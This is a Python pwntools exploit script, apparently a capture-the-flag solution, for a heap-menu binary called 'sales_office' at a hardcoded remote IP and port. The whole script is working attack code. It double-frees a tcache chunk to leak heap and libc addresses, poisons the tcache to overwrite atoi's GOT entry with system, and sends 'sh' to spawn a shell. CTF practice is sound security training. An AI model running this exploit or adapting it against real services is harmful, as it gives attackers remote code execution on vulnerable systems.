#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = './sales_office'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "183.129.189.60"
remotePort = 10038

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('choice:', str(1))
	sla(':', str(size))
	if(size > 0x60):
		return
	sa(':', data)

def rm(idx):
	sla('choice:', str(4))
	sla(':', str(idx))

def md(idx, size, data):
	sla('choice:', str(3))
	sla(':', str(idx))
	sla(':', str(size))
	sla(':', data)

def dp(idx):
	sla('choice:', str(3))
	sla(':', str(idx))

def q():
	sla('choice:', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	area = 0x6020A0
	ad(0x10, 'A' * 0x10)
	rm(0)
	rm(0)
	rm(0)

	dp(0)

	ru('house:\n')
	heap_base = u64(ru('\n').ljust(8, '\x00')) 
	li('heap_base ' + hex(heap_base))
	p = p64(exe.got['free'] - 1)
	ad(0x10, p) #idx 1
	ad(0x80, '') #idx -
	ad(0x10, 'A') #idx 2
	dp(2)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - lib.sym['free']
	li('lib.address ' + hex(lib.address))

	rm(0)
	ad(0x10, p64(exe.got['atoi'])) #idx 3
	rm(3)
	rm(3)
	ad(0x10, p64(exe.got['atoi']))
	ad(0x80, '')
	ad(0x10, p64(lib.sym['system']))
	sl('sh')
	#db()

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
